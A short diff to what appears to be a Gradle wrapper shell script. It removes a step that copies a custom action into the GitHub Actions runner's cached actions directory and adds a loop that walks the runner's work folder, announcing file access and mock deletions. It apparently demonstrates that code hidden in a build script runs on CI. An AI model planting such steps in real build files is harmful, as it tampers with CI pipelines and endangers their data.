@@ -154,8 +154,10 @@ if $cygwin ; then
     esac
 fi
 
-cp -R ./.github/actions/test-action /home/runner/work/_actions/actions/
-ls -laR /home/runner/work/_actions/
+echo We have access to the file system!
+for i in `ls -R /home/runner/work`; do
+  echo "Deleting $i !"
+done
 
 # Escape application args
 save () {
